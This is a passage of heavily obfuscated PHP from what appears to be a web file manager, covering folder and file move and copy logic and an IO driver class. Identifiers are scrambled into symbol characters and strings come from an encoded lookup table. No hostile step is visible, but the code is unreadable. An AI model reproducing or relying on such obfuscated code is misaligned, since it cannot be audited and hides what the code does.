$this->folderSizeReset($Ì‚Ì¿î¬[$¸˙≠®æÆ[498]]); $this->folderSizeReset($≤˝êÏñ’); $Ë±˜áÇø = array($Ì‚Ì¿î¬[$¸˙≠®æÆ[498]], $≤˝êÏñ’); if ($Ì‚Ì¿î¬[$¸˙≠®æÆ[411]] == $¸˙≠®æÆ[99]) { $Ë±˜áÇø[] = $øÀÖ¨â†; } $this->updateModifyTime($Ë±˜áÇø); Model($¸˙≠®æÆ[564])->eventMove($øÀÖ¨â†, $Ì‚Ì¿î¬[$¸˙≠®æÆ[498]], $≤˝êÏñ’); Hook::trigger($¸˙≠®æÆ[591], $Ü…•ÄµÓ); return $ˆ‘âôÎ§; } private function _move($àÌÅíÀﬂ, $¨€‚°”ù, $ú‹¶•∂á, &$Ê¥çîÿÁ, $Ø¥ﬂò∞π = '') { $üµ±ì´Ú =& $_SERVER[ëæªã÷]; $ùû⁄Ÿ π = $this->sourceInfo($àÌÅíÀﬂ); $ÚôßÜõÀ = $ùû⁄Ÿ π[$üµ±ì´Ú[411]] == $üµ±ì´Ú[99]; $«Óôë∞¿ = $Ø¥ﬂò∞π ? $Ø¥ﬂò∞π : $ùû⁄Ÿ π[$üµ±ì´Ú[32]]; $¸â¢ÉÓ≥ = $this->fileNameExistCache($¨€‚°”ù, $«Óôë∞¿); $this->lockMoveStart($àÌÅíÀﬂ); $this->lockWriteStart($¨€‚°”ù, $«Óôë∞¿); if (!$¸â¢ÉÓ≥) { return $this->_moveForce($àÌÅíÀﬂ, $¨€‚°”ù, $«Óôë∞¿); } $ãß∫∂ùç = $¸â¢ÉÓ≥; $¶°ì¥⁄ï = !1; if ($ÚôßÜõÀ) { if ($ú‹¶•∂á == REPEAT_RENAME_FOLDER) { $«Óôë∞¿ = $this->fileNameAuto($¨€‚°”ù, $«Óôë∞¿, $ú‹¶•∂á, $ÚôßÜõÀ); $ãß∫∂ùç = $this->_moveForce($àÌÅíÀﬂ, $¨€‚°”ù, $«Óôë∞¿); } else { if ($ú‹¶•∂á == REPEAT_RENAME_FOLDER) { $ú‹¶•∂á = REPEAT_RENAME; } $ó£◊ﬁÉí = $this->_childrenListSelect($àÌÅíÀﬂ); foreach ($ó£◊ﬁÉí as $Á≈èÒı©) { $this->_move($Á≈èÒı©[$üµ±ì´Ú[403]], $¸â¢ÉÓ≥, $ú‹¶•∂á, $Ê¥çîÿÁ); } $¶°ì¥⁄ï = !0; } } else { if ($ú‹¶•∂á == REPEAT_SKIP) { $¶°ì¥⁄ï = !0; } else { if ($ú‹¶•∂á == REPEAT_RENAME || $ú‹¶•∂á == REPEAT_RENAME_FOLDER) { $«Óôë∞¿ = $this->fileNameAuto($¨€‚°”ù, $«Óôë∞¿, $ú‹¶•∂á, $ÚôßÜõÀ); $ãß∫∂ùç = $this->_moveForce($àÌÅíÀﬂ, $¨€‚°”ù, $«Óôë∞¿); } else { if ($ú‹¶•∂á == REPEAT_REPLACE) { $Úä–À˘£ = $this->sourceInfoCache($¸â¢ÉÓ≥); $Ü≥¯∑»ü = $this->fileHistory($Úä–À˘£, $ùû⁄Ÿ π[$üµ±ì´Ú[467]], $ùû⁄Ÿ π[$üµ±ì´Ú[90]]); $¶°ì¥⁄ï = !0; if ($Ü≥¯∑»ü) { $Ê¥çîÿÁ[$üµ±ì´Ú[560]][] = $ùû⁄Ÿ π[$üµ±ì´Ú[467]]; } } } } } if ($¶°ì¥⁄ï && !$Ê¥çîÿÁ[$üµ±ì´Ú[592]]) { $Ê¥çîÿÁ[$üµ±ì´Ú[592]] = !0; } return $ãß∫∂ùç; } private function _moveForce($’◊åÇô , $º—æéñ•, $ÕŸ˝„ø›) { $∫∞Å“Äƒ =& $_SERVER[ëæªã÷]; $ª◊ı›¢Á = $this->sourceInfo($’◊åÇô ); $ú∑æü±® = $this->sourceInfo($º—æéñ•); $åä√πΩ¯ = $ª◊ı›¢Á[$∫∞Å“Äƒ[411]] == $∫∞Å“Äƒ[99]; $ÓıÄÁØÊ = array($∫∞Å“Äƒ[402] => $ú∑æü±®[$∫∞Å“Äƒ[403]], $∫∞Å“Äƒ[584] => $ú∑æü±®[$∫∞Å“Äƒ[521]] . $ú∑æü±®[$∫∞Å“Äƒ[403]] . $∫∞Å“Äƒ[50], $∫∞Å“Äƒ[580] => $ú∑æü±®[$∫∞Å“Äƒ[412]], $∫∞Å“Äƒ[581] => $ú∑æü±®[$∫∞Å“Äƒ[504]], $∫∞Å“Äƒ[583] => USER_ID, $∫∞Å“Äƒ[421] => $ÕŸ˝„ø›); $§ÆËµ˘Ú = $ª◊ı›¢Á[$∫∞Å“Äƒ[412]] == SourceModel::TYPE_GROUP && $ú∑æü±®[$∫∞Å“Äƒ[412]] == SourceModel::TYPE_GROUP && $ª◊ı›¢Á[$∫∞Å“Äƒ[504]] == $ú∑æü±®[$∫∞Å“Äƒ[504]]; if (!$§ÆËµ˘Ú && $this->moveClearAuth) { Model($∫∞Å“Äƒ[502])->authClear($’◊åÇô ); } $ã≈Øëß√ = $ª◊ı›¢Á[$∫∞Å“Äƒ[431]] == $∫∞Å“Äƒ[99] && $ú∑æü±®[$∫∞Å“Äƒ[431]] != $∫∞Å“Äƒ[99]; if ($ã≈Øëß√) { $ÓıÄÁØÊ[$∫∞Å“Äƒ[430]] = 0; } if ($åä√πΩ¯) { $º˘Èˆáñ = array($∫∞Å“Äƒ[584] => array($∫∞Å“Äƒ[544], $ª◊ı›¢Á[$∫∞Å“Äƒ[521]] . $ª◊ı›¢Á[$∫∞Å“Äƒ[403]] . $∫∞Å“Äƒ[545])); $∑ œ≠æ‰ = $ª◊ı›¢Á[$∫∞Å“Äƒ[521]] . $ª◊ı›¢Á[$∫∞Å“Äƒ[403]] . $∫∞Å“Äƒ[50]; $ë≠ûÔÃó = $ú∑æü±®[$∫∞Å“Äƒ[521]] . $ú∑æü±®[$∫∞Å“Äƒ[403]] . $∫∞Å“Äƒ[50] . $ª◊ı›¢Á[$∫∞Å“Äƒ[403]] . $∫∞Å“Äƒ[50]; $ﬁèò‰áÈ = array($∫∞Å“Äƒ[584] => array($∫∞Å“Äƒ[593], "\x72\145\x70\154\141\143\145\50\160\x61\x72\145\156\x74\114\145\x76\x65\154\x2c\x27{$∑ œ≠æ‰}\47\54\47{$ë≠ûÔÃó}\47\51"), $∫∞Å“Äƒ[580] => $ú∑æü±®[$∫∞Å“Äƒ[412]], $∫∞Å“Äƒ[581] => $ú∑æü±®[$∫∞Å“Äƒ[504]]); if ($ã≈Øëß√) { $ﬁèò‰áÈ[$∫∞Å“Äƒ[430]] = 0; } $this->where($º˘Èˆáñ)->data($ﬁèò‰áÈ)->save(); } $this->where(array($∫∞Å“Äƒ[418] => $’◊åÇô ))->data($ÓıÄÁØÊ)->save(); return $’◊åÇô ; } private function clearShare($≈¨˛ÿµ , $íøËù´°) { $©‰Ω«çØ =& $_SERVER[ëæªã÷]; $ÃÆê»ŸΩ = $this->sourceInfo($≈¨˛ÿµ ); $âÇƒàﬁæ = $this->sourceInfo($íøËù´°); if ($ÃÆê»ŸΩ[$©‰Ω«çØ[504]] == $âÇƒàﬁæ[$©‰Ω«çØ[504]] && $ÃÆê»ŸΩ[$©‰Ω«çØ[412]] == $©‰Ω«çØ[594]) { return; } $±˜†ûﬂ˜ = array($©‰Ω«çØ[521] => array($©‰Ω«çØ[544], $ÃÆê»ŸΩ[$©‰Ω«çØ[521]] . $≈¨˛ÿµ  . $©‰Ω«çØ[545])); $Àø†öˆî = $this->field($©‰Ω«çØ[418])->where($±˜†ûﬂ˜)->getField($©‰Ω«çØ[403], !0); if (!$Àø†öˆî) { return; } $±˜†ûﬂ˜ = array($©‰Ω«çØ[403] => array($©‰Ω«çØ[7], $Àø†öˆî), $©‰Ω«çØ[495] => 1); $§®Õ≈ù» = Model($©‰Ω«çØ[595])->field($©‰Ω«çØ[488])->where($±˜†ûﬂ˜)->select(); if (!$§®Õ≈ù») { return; } $§®Õ≈ù» = array_to_keyvalue($§®Õ≈ù», $©‰Ω«çØ[12], $©‰Ω«çØ[488]); $±˜†ûﬂ˜ = array($©‰Ω«çØ[488] => array($©‰Ω«çØ[7], $§®Õ≈ù»)); Model($©‰Ω«çØ[595])->where($±˜†ûﬂ˜)->save(array($©‰Ω«çØ[495] => 0)); Model($©‰Ω«çØ[596])->where($±˜†ûﬂ˜)->delete(); } public function copyFolderFromIO($ üÿ’†î, $æ‡œ°œâ, $»ëÓãò˙, $ﬂÀ∞ƒ∞Â, $Â–öµÃ’, $Êä°√âô = false) { $º≠ë«ãç =& $_SERVER[ëæªã÷]; $¿¶ÀÌÙá = array($º≠ë«ãç[561] => array(), $º≠ë«ãç[562] => array(), $º≠ë«ãç[560] => array(), $º≠ë«ãç[597] => array()); $÷„æÓÄî = $Êä°√âô ? $Êä°√âô : $ üÿ’†î->pathThis($æ‡œ°œâ); $ÒÜ⁄ÿî’ = $this->fileNameExist($»ëÓãò˙, $÷„æÓÄî); $Ÿ«éπêè = $this->mkdir($»ëÓãò˙, $÷„æÓÄî, $ﬂÀ∞ƒ∞Â); if (!$ÒÜ⁄ÿî’ || $ﬂÀ∞ƒ∞Â == REPEAT_RENAME_FOLDER) { $ﬂÀ∞ƒ∞Â = !1; } if ($ÒÜ⁄ÿî’) { $this->_childrenAllMake($ÒÜ⁄ÿî’); } Hook::trigger($º≠ë«ãç[598]); $this->_copyChildTo($ üÿ’†î, $æ‡œ°œâ, $Ÿ«éπêè, $ﬂÀ∞ƒ∞Â, $¿¶ÀÌÙá, $Â–öµÃ’); Hook::trigger($º≠ë«ãç[599]); if ($Ÿ«éπêè) { $this->folderSizeResetChildren($Ÿ«éπêè); } $this->_childrenListClear(); Model($º≠ë«ãç[563])->addAll($¿¶ÀÌÙá[$º≠ë«ãç[561]], array(), !0); Model($º≠ë«ãç[564])->eventCopy($Ÿ«éπêè); $this->saveAll($¿¶ÀÌÙá[$º≠ë«ãç[562]]); Model($º≠ë«ãç[470])->linkAdd($¿¶ÀÌÙá[$º≠ë«ãç[560]]); Model($º≠ë«ãç[470])->remove($¿¶ÀÌÙá[$º≠ë«ãç[597]]); $this->folderSizeReset($»ëÓãò˙); $this->updateModifyTime($»ëÓãò˙); return $Ÿ«éπêè; } private function _copyChildTo($…âñƒÑí, $õÉ∂Áü¡, $ÎÏµõ⁄, $ﬁÇ‹”‘∞, &$‹≠óÃÂÂ, $—õ˚’∞£) { $Öè∏ŒÔÏ =& $_SERVER[ëæªã÷]; $ÿÂåé÷≈ = $this->sourceInfoCache($ÎÏµõ⁄); $ãÒÛéÕú = $…âñƒÑí->listPath($õÉ∂Áü¡); $ãÒÛéÕú = $ãÒÛéÕú ? $ãÒÛéÕú : array($Öè∏ŒÔÏ[86] => array(), $Öè∏ŒÔÏ[87] => array()); $ıù˛ÑÇ¨ = array_merge($ãÒÛéÕú[$Öè∏ŒÔÏ[86]], $ãÒÛéÕú[$Öè∏ŒÔÏ[87]]); $óÜÙ∫°¢ = $this->_addFiles($…âñƒÑí, $ãÒÛéÕú[$Öè∏ŒÔÏ[86]], $—õ˚’∞£); $ñÕÔ˜Ôò = array(); foreach ($ıù˛ÑÇ¨ as &$ÃÛ◊ìô©) { if (isset($óÜÙ∫°¢[$ÃÛ◊ìô©[$Öè∏ŒÔÏ[32]]])) { $ÃÛ◊ìô© = $óÜÙ∫°¢[$ÃÛ◊ìô©[$Öè∏ŒÔÏ[32]]]; } $ÃÛ◊ìô©[$Öè∏ŒÔÏ[411]] = $ÃÛ◊ìô©[$Öè∏ŒÔÏ[33]] == $Öè∏ŒÔÏ[89]; $ÃÛ◊ìô©[$Öè∏ŒÔÏ[413]] = _get($ÃÛ◊ìô©, $Öè∏ŒÔÏ[177], $Öè∏ŒÔÏ[12]); $ÃÛ◊ìô©[$Öè∏ŒÔÏ[90]] = _get($ÃÛ◊ìô©, $Öè∏ŒÔÏ[90], 0); $ÃÛ◊ìô©[$Öè∏ŒÔÏ[467]] = _get($ÃÛ◊ìô©, $Öè∏ŒÔÏ[467], 0); if (!isset($ÃÛ◊ìô©[$Öè∏ŒÔÏ[600]]) && $ÃÛ◊ìô©[$Öè∏ŒÔÏ[467]]) { $‹≠óÃÂÂ[$Öè∏ŒÔÏ[597]][] = $ÃÛ◊ìô©[$Öè∏ŒÔÏ[467]]; } if ($ﬁÇ‹”‘∞) { $ÚÃ—÷àß = $this->fileNameExistCache($ÎÏµõ⁄, $ÃÛ◊ìô©[$Öè∏ŒÔÏ[32]]); if ($ÚÃ—÷àß) { if ($ÃÛ◊ìô©[$Öè∏ŒÔÏ[411]] || $ﬁÇ‹”‘∞ == REPEAT_SKIP) { continue; } if ($ﬁÇ‹”‘∞ == REPEAT_REPLACE) { $»åÔ∫Êô = $this->sourceInfoCache($ÚÃ—÷àß); $Œ˜˝ÏÎÍ = $this->fileHistory($»åÔ∫Êô, $ÃÛ◊ìô©[$Öè∏ŒÔÏ[467]], $ÃÛ◊ìô©[$Öè∏ŒÔÏ[90]]); if ($Œ˜˝ÏÎÍ) { $‹≠óÃÂÂ[$Öè∏ŒÔÏ[560]][] = $ÃÛ◊ìô©[$Öè∏ŒÔÏ[467]]; } continue; } else { if ($ﬁÇ‹”‘∞ == REPEAT_RENAME) { $ÃÛ◊ìô©[$Öè∏ŒÔÏ[32]] = $this->fileNameAutoCache($ÎÏµõ⁄, $ÃÛ◊ìô©[$Öè∏ŒÔÏ[32]], $ﬁÇ‹”‘∞, !1); } } } } if (!$ÃÛ◊ìô©[$Öè∏ŒÔÏ[411]] && $ÃÛ◊ìô©[$Öè∏ŒÔÏ[467]] == 0) { continue; } if (!$ÃÛ◊ìô©[$Öè∏ŒÔÏ[411]] && $ÃÛ◊ìô©[$Öè∏ŒÔÏ[467]]) { $‹≠óÃÂÂ[$Öè∏ŒÔÏ[560]][] = $ÃÛ◊ìô©[$Öè∏ŒÔÏ[467]]; } $ñÕÔ˜Ôò[] = $this->_makeItemData($ÃÛ◊ìô©, $ÿÂåé÷≈, $ÃÛ◊ìô©[$Öè∏ŒÔÏ[32]]); } unset($ÃÛ◊ìô©); if (!empty($ñÕÔ˜Ôò)) { $this->addAll($ñÕÔ˜Ôò); $this->_childrenListSelect($ÎÏµõ⁄); } $Ëæˆ≠ˆ… = $this->_childrenList($ÎÏµõ⁄); $Ëæˆ≠ˆ… = array_to_keyvalue($Ëæˆ≠ˆ…, $Öè∏ŒÔÏ[32]); foreach ($ıù˛ÑÇ¨ as $ÃÛ◊ìô©) { $»åÔ∫Êô = $Ëæˆ≠ˆ…[$ÃÛ◊ìô©[$Öè∏ŒÔÏ[32]]]; $Òü±•üË = $»åÔ∫Êô[$Öè∏ŒÔÏ[403]]; $this->_copyApplyMeta($»åÔ∫Êô, $‹≠óÃÂÂ); if ($ÃÛ◊ìô©[$Öè∏ŒÔÏ[33]] == $Öè∏ŒÔÏ[89]) { $ÃÛ◊ìô©[$Öè∏ŒÔÏ[88]] = $…âñƒÑí->getPathInner($ÃÛ◊ìô©[$Öè∏ŒÔÏ[88]]); $this->_copyChildTo($…âñƒÑí, $ÃÛ◊ìô©[$Öè∏ŒÔÏ[88]], $Òü±•üË, $ﬁÇ‹”‘∞, $‹≠óÃÂÂ, $—õ˚’∞£); } } } private function _addFiles($∏€¥ù–É, $«Ñä°¨ù, $à˙œôØä) { $°ÂëÁñÊ =& $_SERVER[ëæªã÷]; if (!$«Ñä°¨ù || count($«Ñä°¨ù) == 0) { return array(); } $Ë ≥…›” = array(); foreach ($«Ñä°¨ù as &$’µ‘◊·¨) { Hook::trigger($°ÂëÁñÊ[601], $’µ‘◊·¨); $’µ‘◊·¨[$°ÂëÁñÊ[88]] = $∏€¥ù–É->getPathInner($’µ‘◊·¨[$°ÂëÁñÊ[88]]); $†å∂≈π° = $∏€¥ù–É->hashSimple($’µ‘◊·¨[$°ÂëÁñÊ[88]]); $≠ß”¢™› = $∏€¥ù–É->hashMd5($’µ‘◊·¨[$°ÂëÁñÊ[88]]); if (strlen($≠ß”¢™›) > 10 && !isset($Ë ≥…›”[$≠ß”¢™›])) { $Ë ≥…›”[$≠ß”¢™›] = array(); } $’µ‘◊·¨[$°ÂëÁñÊ[180]] = $†å∂≈π°; $’µ‘◊·¨[$°ÂëÁñÊ[179]] = $≠ß”¢™›; Hook::trigger($°ÂëÁñÊ[602], $’µ‘◊·¨); $Ë ≥…›”[$≠ß”¢™›][] =& $’µ‘◊·¨; if (count($Ë ≥…›”[$≠ß”¢™›]) > 1) { $’µ‘◊·¨[$°ÂëÁñÊ[600]] = !0; } } unset($’µ‘◊·¨); $ºŒ§Û…á = array($°ÂëÁñÊ[179] => array($°ÂëÁñÊ[7], array_keys($Ë ≥…›”))); $§Ç˙∞è≈ = Model($°ÂëÁñÊ[603]); $≥“ôÛû∑ = $§Ç˙∞è≈->where($ºŒ§Û…á)->select(); $≥“ôÛû∑ = $≥“ôÛû∑ ? $≥“ôÛû∑ : array(); foreach ($≥“ôÛû∑ as $∑Ÿˆ≥Ç—) { if (!isset($Ë ≥…›”[$∑Ÿˆ≥Ç—[$°ÂëÁñÊ[179]]])) { continue; } $ì˝äƒ∫§ = $Ë ≥…›”[$∑Ÿˆ≥Ç—[$°ÂëÁñÊ[179]]]; foreach ($ì˝äƒ∫§ as &$’µ‘◊·¨) { $’µ‘◊·¨[$°ÂëÁñÊ[467]] = $∑Ÿˆ≥Ç—[$°ÂëÁñÊ[467]]; $’µ‘◊·¨[$°ÂëÁñÊ[600]] = !0; } unset($’µ‘◊·¨); } $ßÕ∆úò€ = array(); foreach ($«Ñä°¨ù as $Ωﬂë€˝Ü) { if (isset($Ωﬂë€˝Ü[$°ÂëÁñÊ[600]]) && $Ωﬂë€˝Ü[$°ÂëÁñÊ[600]]) { continue; } $üê°û•ü = $∏€¥ù–É->getPathInner($Ωﬂë€˝Ü[$°ÂëÁñÊ[88]]); $ﬁ˛©Ë≈˘ = $§Ç˙∞è≈->addFileMake($üê°û•ü, $Ωﬂë€˝Ü[$°ÂëÁñÊ[90]], $Ωﬂë€˝Ü[$°ÂëÁñÊ[180]], $Ωﬂë€˝Ü[$°ÂëÁñÊ[179]], $Ωﬂë€˝Ü[$°ÂëÁñÊ[32]], $à˙œôØä); if (!is_array($ﬁ˛©Ë≈˘)) { continue; } $ßÕ∆úò€[] = $ﬁ˛©Ë≈˘; } $§Ç˙∞è≈->addAll($ßÕ∆úò€); $ºŒ§Û…á = array($°ÂëÁñÊ[179] => array($°ÂëÁñÊ[7], array_keys($Ë ≥…›”))); $≥“ôÛû∑ = $§Ç˙∞è≈->where($ºŒ§Û…á)->select(); $≥“ôÛû∑ = $≥“ôÛû∑ ? $≥“ôÛû∑ : array(); foreach ($≥“ôÛû∑ as $∑Ÿˆ≥Ç—) { if (!isset($Ë ≥…›”[$∑Ÿˆ≥Ç—[$°ÂëÁñÊ[179]]])) { continue; } $›®‚ã∏ü =& $Ë ≥…›”[$∑Ÿˆ≥Ç—[$°ÂëÁñÊ[179]]]; foreach ($›®‚ã∏ü as &$’µ‘◊·¨) { $’µ‘◊·¨[$°ÂëÁñÊ[467]] = $∑Ÿˆ≥Ç—[$°ÂëÁñÊ[467]]; } unset($’µ‘◊·¨); } $˘Ö„ÌÅ› = array(); foreach ($«Ñä°¨ù as $›∑ﬁË™∂) { $˘Ö„ÌÅ›[$›∑ﬁË™∂[$°ÂëÁñÊ[32]]] = $›∑ﬁË™∂; } return $˘Ö„ÌÅ›; } } define($_SERVER[ëæªã÷][604], $_SERVER[ëæªã÷][605]); $pakvoiztqf = $_SERVER[ëæªã÷][606]; goto F ÑùıÕ¿Í; bπ¯πú¬è‰: class IO extends ClassBaseCall { public static $driverCache = array(); public static $driverListSystem = array(); public static $driverListUser = array(); public static function __callStatic($›Ë†üâ‡, $º‹Äî∏§) { $˛˚≥õÜô =& $_SERVER[ëæªã÷]; $µπ§’êã = $º‹Äî∏§; $GLOBALS[$˛˚≥õÜô[1122]] = $˛˚≥õÜô[1123] . $›Ë†üâ‡; Hook::trigger($˛˚≥õÜô[1123] . $›Ë†üâ‡ . $˛˚≥õÜô[1124], $µπ§’êã); $∑¬ÙÍÂ˚ = self::driverMake($º‹Äî∏§[0]); if (!$∑¬ÙÍÂ˚) { return !1; } if (method_exists($∑¬ÙÍÂ˚, $›Ë†üâ‡)) { $£˚∂õ®‡ = @call_user_func_array(array($∑¬ÙÍÂ˚, $›Ë†üâ‡), $º‹Äî∏§); } else { if (method_exists($∑¬ÙÍÂ˚, $˛˚≥õÜô[1125])) { $£˚∂õ®‡ = @call_user_func_array(array($∑¬ÙÍÂ˚, $›Ë†üâ‡), $º‹Äî∏§); } else { if (method_exists(self, $›Ë†üâ‡)) { $£˚∂õ®‡ = @call_user_func_array(array(self, $›Ë†üâ‡), $º‹Äî∏§); } else { $£˚∂õ®‡ = call_user_func_array(array(parent, $›Ë†üâ‡), $º‹Äî∏§); } } } Hook::trigger($˛˚≥õÜô[1123] . $›Ë†üâ‡ . $˛˚≥õÜô[1126], $µπ§’êã, $£˚∂õ®‡); return $£˚∂õ®‡; } public static function init($°ÕŸﬁ˛) { return self::driverMake($°ÕŸﬁ˛); } public static function copy($î÷®Ò≤Î, $Çø∞†àª, $⁄Ùè¸œâ = false, $ ÃÊÇ°® = false) { return self::copyMoveStart($î÷®Ò≤Î, $Çø∞†àª, $⁄Ùè¸œâ, $_SERVER[ëæªã÷][549], $ ÃÊÇ°®); } public static function move($ó¯î◊ˆ∏, $ò§◊‚º…, $¸á¬ø¶◊ = false, $ê ﬂ´“≈ = false) { return self::copyMoveStart($ó¯î◊ˆ∏, $ò§◊‚º…, $¸á¬ø¶◊, $_SERVER[ëæªã÷][551], $ê ﬂ´“≈); } private static function copyMoveStart($Ç˝µéí∆, $®¢ﬂ¥√¨, $ÿπø¶ÊÒ, $° Ï≈ÿ„, $âÌ∑èÉ⁄) { $éÇå°ÓØ =& $_SERVER[ëæªã÷]; $‹§Öîúô = array($Ç˝µéí∆, $®¢ﬂ¥√¨, $ÿπø¶ÊÒ, $âÌ∑èÉ⁄); Hook::trigger($éÇå°ÓØ[1123] . $° Ï≈ÿ„ . $éÇå°ÓØ[1124], $‹§Öîúô); $âé™é®á = self::copyMove($Ç˝µéí∆, $®¢ﬂ¥√¨, $ÿπø¶ÊÒ, $° Ï≈ÿ„, $âÌ∑èÉ⁄); Hook::trigger($éÇå°ÓØ[1123] . $° Ï≈ÿ„ . $éÇå°ÓØ[1126], $‹§Öîúô, $âé™é®á); return $âé™é®á; } public static function saveFile($òÅ–©‘Œ, $⁄±°âª◊, $„òÆºÛÇ = true) { $§Á‰®ã÷ =& $_SERVER[ëæªã÷]; $¿ÊÃ•Ïú = self::info($⁄±°âª◊); $Üñ¸»Ãá = self::driverMake($òÅ–©‘Œ); $£ìüÅœÄ = self::driverMake($⁄±°âª◊); $È•„—¯’ = !1; if ($£ìüÅœÄ->pathParse[$§Á‰®ã÷[1127]]) { $È•„—¯’ = $£ìüÅœÄ; $èõÂÔ„¢ = $£ìüÅœÄ->pathParse[$§Á‰®ã÷[1127]]; $£ìüÅœÄ = self::driverMake($èõÂÔ„¢); } if ($Üñ¸»Ãá->pathParse[$§Á‰®ã÷[1127]]) { $©ﬂ¢”®† = $Üñ¸»Ãá->pathParse[$§Á‰®ã÷[1127]]; $Üñ¸»Ãá = self::driverMake($©ﬂ¢”®†); } $ÎÄÖÂ”˛ = $£ìüÅœÄ->pathFather($⁄±°âª◊); $’«‘º¡¶ = !0; if (!$„òÆºÛÇ && self::driverIsSame($Üñ¸»Ãá, $£ìüÅœÄ)) { $’«‘º¡¶ = !1; } $ì˙¨ÎÏ≤ = self::copyFile($Üñ¸»Ãá, $òÅ–©‘Œ, $£ìüÅœÄ, $ÎÄÖÂ”˛, $¿ÊÃ•Ïú[$§Á‰®ã÷[32]], $’«‘º¡¶); if ($È•„—¯’) { $ì˙¨ÎÏ≤ = $È•„—¯’->getPathOuter($ì˙¨ÎÏ≤); } return $ì˙¨ÎÏ≤; } private static function copyMove($À⁄ÿÃ»Ê, $€™É‘¢Ì, $åı´Ò≥‘, $˝∂èØ—«, $“ÆÓ¥Ô‚ = false) { $≈”‡πãß =& $_SERVER[ëæªã÷]; if (!$À⁄ÿÃ»Ê || $À⁄ÿÃ»Ê == $≈”‡πãß[8] || !$€™É‘¢Ì) { return !1; } ignore_timeout(); $„°Ì‰Æ“ = self::driverMake($À⁄ÿÃ»Ê); $¶øÑŒ¥‘ = self::driverMake($€™É‘¢Ì); $æÆ˝àË‹ = $˝∂èØ—« == $≈”‡πãß[551]; $Ô˝√Œ¡‡ = !1; if ($¶øÑŒ¥‘->pathParse[$≈”‡πãß[1127]]) { $Ô˝√Œ¡‡ = $¶øÑŒ¥‘; $€™É‘¢Ì = $¶øÑŒ¥‘->pathParse[$≈”‡πãß[1127]]; $¶øÑŒ¥‘ = self::driverMake($€™É‘¢Ì); } if ($„°Ì‰Æ“->pathParse[$≈”‡πãß[1127]]) { $À⁄ÿÃ»Ê = $„°Ì‰Æ“->pathParse[$≈”‡πãß[1127]]; $„°Ì‰Æ“ = self::driverMake($À⁄ÿÃ»Ê); } self::check($„°Ì‰Æ“, $À⁄ÿÃ»Ê, $¶øÑŒ¥‘, $€™É‘¢Ì); Hook::trigger($≈”‡πãß[85], $„°Ì‰Æ“, $À⁄ÿÃ»Ê, $¶øÑŒ¥‘, $€™É‘¢Ì); $™…¬Ÿ˚• = self::driverIsSame($„°Ì‰Æ“, $¶øÑŒ¥‘); if ($™…¬Ÿ˚•) { if ($˝∂èØ—« == $≈”‡πãß[551] && !method_exists($¶øÑŒ¥‘, $≈”‡πãß[1128]) && trim($€™É‘¢Ì, $≈”‡πãß[8]) == trim($¶øÑŒ¥‘->pathFather($À⁄ÿÃ»Ê), $≈”‡πãß[8])) { if ($„°Ì‰Æ“->pathThis($À⁄ÿÃ»Ê) != $“ÆÓ¥Ô‚ && !$„°Ì‰Æ“->isTypeObject()) { return $„°Ì‰Æ“->rename($À⁄ÿÃ»Ê, $“ÆÓ¥Ô‚); } return $¶øÑŒ¥‘->getPathOuter($À⁄ÿÃ»Ê); } if (method_exists($¶øÑŒ¥‘, $˝∂èØ—«)) { return $¶øÑŒ¥‘->{$˝∂èØ—«}($À⁄ÿÃ»Ê, $€™É‘¢Ì, $åı´Ò≥‘, $“ÆÓ¥Ô‚); } } if ($™…¬Ÿ˚• && $˝∂èØ—« == $≈”‡πãß[551] && $¶øÑŒ¥‘->getType() == $≈”‡πãß[117]) { $…˚£ô™˚ = $¶øÑŒ¥‘->movePath($À⁄ÿÃ»Ê, $€™É‘¢Ì, $“ÆÓ¥Ô‚); if ($…˚£ô™˚) { return $…˚£ô™˚; } } $àÃÇÆ¿ì = $„°Ì‰Æ“->isFile($À⁄ÿÃ»Ê); if (!$àÃÇÆ¿ì && $¶øÑŒ¥‘->getType() == $≈”‡πãß[738] && $„°Ì‰Æ“->getType() == $≈”‡πãß[117]) { $…˚£ô™˚ = $¶øÑŒ¥‘->copyFolderFromIO($„°Ì‰Æ“, $À⁄ÿÃ»Ê, $€™É‘¢Ì, $åı´Ò≥‘, $æÆ˝àË‹, $“ÆÓ¥Ô‚); } else { $…˚£ô™˚ = self::copyPath($„°Ì‰Æ“, $À⁄ÿÃ»Ê, $¶øÑŒ¥‘, $€™É‘¢Ì, $åı´Ò≥‘, $æÆ˝àË‹, $àÃÇÆ¿ì, $“ÆÓ¥Ô‚); } if ($…˚£ô™˚ && $æÆ˝àË‹) { $„°Ì‰Æ“->remove($À⁄ÿÃ»Ê); } if ($Ô˝√Œ¡‡) { $…˚£ô™˚ = $Ô˝√Œ¡‡->getPathOuter($…˚£ô™˚); } return $…˚£ô™˚; } private static function check($£¢ﬁƒô¯, $ıæÍÌï„, $ÌùÏ≈ó„, &$≠ÓπÙ”˘) { $Üï€ºÆÏ =& $_SERVER[ëæªã÷]; if (self::driverIsSame($£¢ﬁƒô¯, $ÌùÏ≈ó„) && $£¢ﬁƒô¯->isFolder($ıæÍÌï„) && $£¢ﬁƒô¯->isParentOf($ıæÍÌï„, $≠ÓπÙ”˘)) { show_json(LNG($Üï€ºÆÏ[1129]), !1); } if (!$£¢ﬁƒô¯->exist($ıæÍÌï„)) { show_json(LNG($Üï€ºÆÏ[116]), !1); } } private static function copyPath($´Ë´ÙÇ§, $˛£œ†Ê¨, $íòÜ»ûÖ, $ƒ§‰¿ÖÒ, $»‘‹éÍÔ, $ö˘ ·È˜, $ÕÃãùÌæ, $‚Ç≥…Õµ = false) { $≈•æÁøÏ =& $_SERVER[ëæªã÷]; $±»©µ£ç = empty($‚Ç≥…Õµ) && $‚Ç≥…Õµ !== $≈•æÁøÏ[200] ? $´Ë´ÙÇ§->pathThis($˛£œ†Ê¨) : $‚Ç≥…Õµ; if ($»‘‹éÍÔ) { $·Õ‹¿πµ = $íòÜ»ûÖ->fileNameExist($ƒ§‰¿ÖÒ, $±»©µ£ç); $±»©µ£ç = $íòÜ»ûÖ->fileNameAuto($ƒ§‰¿ÖÒ, $±»©µ£ç, $»‘‹éÍÔ, !$ÕÃãùÌæ); $»‘‹éÍÔ = $·Õ‹¿πµ ? $»‘‹éÍÔ : !1; } if ($ÕÃãùÌæ) { return self::copyFile($´Ë´ÙÇ§, $˛£œ†Ê¨, $íòÜ»ûÖ, $ƒ§‰¿ÖÒ, $±»©µ£ç, $ö˘ ·È˜); } if ($»‘‹éÍÔ == REPEAT_RENAME_FOLDER) { $»‘‹éÍÔ = !1; } $ªáÎÕÓ∂ = rtrim($ƒ§‰¿ÖÒ, $≈•æÁøÏ[8]) . $≈•æÁøÏ[8] . $±»©µ£ç; $¡çª÷•∑ = 